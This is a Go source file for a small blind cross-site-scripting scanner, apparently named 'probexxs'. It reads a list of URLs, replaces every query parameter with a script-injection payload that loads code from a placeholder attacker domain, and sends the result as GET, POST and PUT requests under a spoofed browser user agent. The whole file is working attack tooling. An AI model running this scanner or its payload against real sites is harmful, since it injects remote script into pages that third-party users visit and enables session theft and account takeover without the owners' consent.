package main

import (
	"bufio"
	"fmt"
	"net/http"
	"net/url"
	"os"
	"strings"
	"time"
)

var userAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
var requestDelay = 3 * time.Second

var payloads = []string{
	`"><script src="https://YOURXSS.DOMAIN"></script>`,
}

func main() {
	if len(os.Args) < 2 {
		fmt.Println("Usage: go run main.go <file>")
		return
	}

	file, err := os.Open(os.Args[1])
	if err != nil {
		fmt.Println("Error opening the file:", err)
		return
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)

	for scanner.Scan() {
		rawURL := scanner.Text()
		for _, payload := range payloads {
			modURL := modifyAllParams(rawURL, payload)
			if modURL != "" {
				sendRequest(modURL, "GET")
				time.Sleep(requestDelay)
				sendRequest(modURL, "POST")
				time.Sleep(requestDelay)
				sendRequest(modURL, "PUT")
				time.Sleep(requestDelay)
			}
		}
	}

	if err := scanner.Err(); err != nil {
		fmt.Println("Error reading the file:", err)
	}

	fmt.Println("Execution of probexxs has finished.")
}

func modifyAllParams(rawURL, payload string) string {
	parsedURL, err := url.Parse(rawURL)
	if err != nil {
		fmt.Println("Error parsing URL:", rawURL)
		return ""
	}

	queryParams := parsedURL.Query()

	for key := range queryParams {
		queryParams.Set(key, payload) // Replace all values with the same payload
	}

	parsedURL.RawQuery = queryParams.Encode()
	return parsedURL.String()
}

func sendRequest(targetURL, method string) {
	client := &http.Client{
		Timeout:       10 * time.Second,
		CheckRedirect: func(req *http.Request, via []*http.Request) error { return nil },
	}

	var req *http.Request
	var err error

	if method == "POST" || method == "PUT" {
		parsedURL, _ := url.Parse(targetURL)
		postData := parsedURL.Query().Encode()
		req, err = http.NewRequest(method, parsedURL.Scheme+"://"+parsedURL.Host+parsedURL.Path, strings.NewReader(postData))
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	} else {
		req, err = http.NewRequest("GET", targetURL, nil)
	}

	if err != nil {
		fmt.Println("Error creating request:", err)
		return
	}

	req.Header.Set("User-Agent", userAgent)

	resp, err := client.Do(req)
	if err != nil {
		fmt.Println("Request error:", err)
		return
	}
	defer resp.Body.Close()

	fmt.Printf("[%s] %s -> %d\n", method, targetURL, resp.StatusCode)
}
